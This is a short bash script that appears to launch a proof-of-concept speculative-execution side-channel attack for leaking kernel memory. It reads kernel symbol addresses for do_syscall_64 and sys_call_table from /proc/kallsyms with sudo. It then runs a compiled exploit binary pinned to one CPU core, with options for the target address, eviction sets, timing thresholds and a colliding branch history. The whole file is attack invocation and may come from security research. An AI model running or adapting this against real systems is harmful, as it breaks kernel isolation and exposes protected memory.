#!/bin/bash 
addr="0x"$(sudo cat /proc/kallsyms | grep do_syscall_64 | cut -d ' ' -f 1)
off=$(sudo cat /proc/kallsyms | grep " sys_call_table" | cut -d ' ' -f 1)

#-a : addr to leak
#-f : fr_buf threshold (see run output to tune it)
#-l : enable sys_call_table eviction (make attack more reliable)
#-o : sys_call_table page offset
#-e : desired size of sys_call_table eviction set. The lower the better but due to the noise it can be hard to obtain one
#-s : sys_call_table eviction threshold (see run output to tune it)
#-h : to avoid recomputing a colliding history it can be provided here. WARNING: eBPF uses ASLR, so it cannot work across
#     multiple runs

taskset -c 0 ./main.o -a $addr -f 40 -l -o 0x${off:13} -e 256 -s 350 


